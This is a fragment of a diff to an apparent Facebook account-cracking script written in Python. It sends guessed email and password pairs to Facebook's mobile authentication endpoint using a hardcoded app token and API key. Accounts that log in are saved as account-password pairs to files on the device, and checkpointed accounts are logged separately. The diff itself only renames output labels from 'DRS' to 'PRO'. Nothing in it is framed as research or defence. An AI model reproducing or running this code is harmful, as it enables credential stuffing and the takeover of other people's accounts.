+            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
             response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
             if 'session_key' in response.text:
                 okacc.append(acc)
-                print('\r\033[1;92m [DRS-OK] '+acc+'| '+pword+'  ')
-                open('/sdcard/DRS-OK.txt','a').write(f'{acc} • {pword}\n')
+                print('\r\033[1;92m [PRO-OK] '+acc+'| '+pword+'  ')
+                open('/sdcard/PRO-OK.txt','a').write(f'{acc} • {pword}\n')
                 if c=='y':
                  try:  
                   q = json.loads(response.text)
@@ -1488,9 +1488,9 @@ def method():
                 if cpok=='n':
                      pass
                 else:
-                     print('\r\033[1;91m [DRS-CP] '+acc+'| '+pword)
+                     print('\r\033[1;91m [PRO-CP] '+acc+'| '+pword)
                 cpacc.append(acc)
-                open('/sdcard/DRS-CP.txt','a').write(f'{acc} • {pword}\n')
+                open('/sdcard/PRO-CP.txt','a').write(f'{acc} • {pword}\n')
                 break
             else:
                 continue
